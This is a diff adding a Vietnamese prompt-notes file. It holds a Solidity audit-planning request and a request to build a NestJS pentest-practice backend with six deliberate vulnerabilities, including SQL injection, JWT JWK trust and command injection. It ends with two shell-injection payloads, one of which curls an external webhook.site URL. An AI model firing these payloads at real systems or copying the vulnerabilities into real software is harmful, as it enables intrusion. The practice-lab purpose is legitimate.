@@ -1,0 +1,14 @@
+Dựa trên x-ray report, hãy:
+1. Liệt kê TOÀN BỘ file .sol cần audit trong src/ (trừ test/, lib/, mocks/, interfaces/)
+2. Xếp ưu tiên từ cao → thấp theo entry-points.md và attack surfaces
+3. Chia thành các batch, mỗi batch 3–6 file
+4. Mỗi batch cho ra 1 lệnh /solidity-auditor đầy đủ đường dẫn
+5. Cuối cùng thêm 1 lệnh sweep toàn repo để bắt phần còn sót
+6. Xác nhận đã cover 100% file in-scope
+
+
+Tôi muốn xây dựng backend của website có chứa 6 lỗ hổng để thực hành pentest. Dự án sử dụng nestjs để xây dựng backend. Hiện tại chỉ cần xây dựng api, không cần giao diện. Website chỉnh sửa ảnh đơn giản, có thể login, register, có 2 role là user và admin, chức năng khám phá hình ảnh sử dụng picsum để lấy các ảnh ngẫu nhiên, sử dụng mysql chạy trong docker. Lỗ hổng số 1 là path traversal xảy ra ở chức năng download hình ảnh. lỗ hổng thứ 2 file upload xảy ra ở chức năng upload hình ảnh dẫn đến XSS. lỗ hổng thứ 3 command injection xảy ra khi chỉnh sửa hình ảnh bằng lệnh của ImageMagick (tôi đã cài trên máy). lỗ hổng thứ 4 là jwt xảy ra khi tin tưởng jwk trong jwt header để verify token sử dụng thuật toán RS256. lỗ hổng thứ 5 là sql injection khi user tìm kiếm ảnh ở explore (có thông báo lỗi sql syntax), trường hợp 2 là blind sql xảy ra khi user tìm kiếm ảnh của bản thân. Lỗ hổng thứ 6 là prototype pollution khi deep merge để thay đổi cấu hình giao diện. 
+
+600 & ping -n 6 127.0.0.1 & rem
+
+600 & curl "https://webhook.site/c5b14cca-028c-4285-8d6b-c4418a7d9936" & rem
